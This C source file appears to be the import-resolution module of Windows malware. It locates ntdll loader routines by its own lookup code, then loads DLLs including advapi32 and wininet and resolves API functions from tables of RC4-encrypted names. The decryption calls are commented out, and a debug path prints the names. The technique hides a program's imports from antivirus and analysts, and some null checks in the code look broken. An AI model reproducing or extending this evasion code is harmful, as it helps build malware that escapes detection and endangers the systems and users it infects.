#include "resolve.h"
#ifdef DEBUG_CODE
#include <stdio.h>
#endif
extern PVOID My_GetModuleBase(LPCWSTR lpszModule);
extern PVOID My_GetModuleProcedureAddress(PVOID pModule, LPCSTR RoutineName);
BOOL ResolveImports() {
	PVOID ntdll = My_GetModuleBase(L"ntdll.dll");
	BOOL status = FALSE;
	if (ntdll != NULL) {
		LdrLoadDll = (_LdrLoadDll)My_GetModuleProcedureAddress(ntdll, LDRLOADDLL);
		RtlInitAnsiString = (_RtlInitAnsiString)My_GetModuleProcedureAddress(ntdll, RTLINITANSISTRING);
		RtlInitUnicodeString = (_RtlInitUnicodeString)My_GetModuleProcedureAddress(ntdll, RTLINITUNICODESTRING);
		LdrGetProcedureAddress = (_LdrGetProcedureAddress)My_GetModuleProcedureAddress(ntdll, LDRGETPROCEDUREADDRESS);
		LdrGetDllHandle = (_LdrGetDllHandle)My_GetModuleProcedureAddress(ntdll, LDRGETDLLHANDLE);

		if ((LdrLoadDll != NULL) && (RtlInitAnsiString != NULL) && (RtlInitUnicodeString != NULL) && (LdrGetProcedureAddress != NULL) && (LdrGetDllHandle != NULL)) {
			UINT Counter = 0;
			while (EncryptedStringDll[Counter].Dll != NULL) {
				ULONG uLen = 0;
				LPWSTR DllName = NULL;
#ifdef DEBUG_CODE
				DllName = EncryptedStringDll[Counter].Dll;
				printf("DllName: %S\n", DllName);
#endif
//				DecryptUnicodeString(RC4_KEY, &DllName, EncryptedStringDll[Counter].Dll, EncryptedStringDll[Counter].stDll);
				if (DllName != NULL) {
					MY_UNICODE_STRING psDllName = { 0 };
					RtlInitUnicodeString(&psDllName, DllName);
					if (&psDllName.Buffer != NULL) {
						NTSTATUS status = LdrLoadDll(NULL, 0, &psDllName, EncryptedStringDll[Counter].hDll);
						if (NT_SUCCESS(status)) {
							LdrGetDllHandle(NULL, NULL, &psDllName, &EncryptedStringDll[Counter].hDll);
						}
					}
				}
				Counter++;
			}
			if ((hAdvapi32 != NULL) && (hNTDLL != NULL) && (hKernel32 != NULL) && (hUser32 != NULL) && (hWininet != NULL)) {
				Counter = 0;
				while (EncryptedStringApi[Counter].STRING != NULL) {
					ULONG uLen = 0;
					LPSTR Decrypted_API = NULL;
			//		DecryptANSIString(RC4_KEY, &Decrypted_API, EncryptedStringApi[Counter].STRING, EncryptedStringApi[Counter].stLENGTH);
#ifdef DEBUG_CODE
					Decrypted_API = EncryptedStringApi[Counter].STRING;
					printf("Decrypted_API: %s\n", Decrypted_API);
#endif
					if (Decrypted_API != NULL) {
						MY_ANSI_STRING ANSIS_MyString = { 0 };
						RtlInitAnsiString(&ANSIS_MyString, Decrypted_API);
						if (&ANSIS_MyString.Buffer != NULL) {
							//printf("EncryptedStringApi[Counter].Type : %d\n", EncryptedStringApi[Counter].Type);
							if (EncryptedStringDll[EncryptedStringApi[Counter].Type].hDll != NULL) {
								LdrGetProcedureAddress(EncryptedStringDll[EncryptedStringApi[Counter].Type].hDll, &ANSIS_MyString, 0, (PVOID*)EncryptedStringApi[Counter].lpFunc);
							}
						}
#ifdef DEBUG_CODE
						printf("Counter: %d\n", Counter);
#endif
					}
					Counter++;
				}
				status = TRUE;
			}
		}

	}
	return status;
}
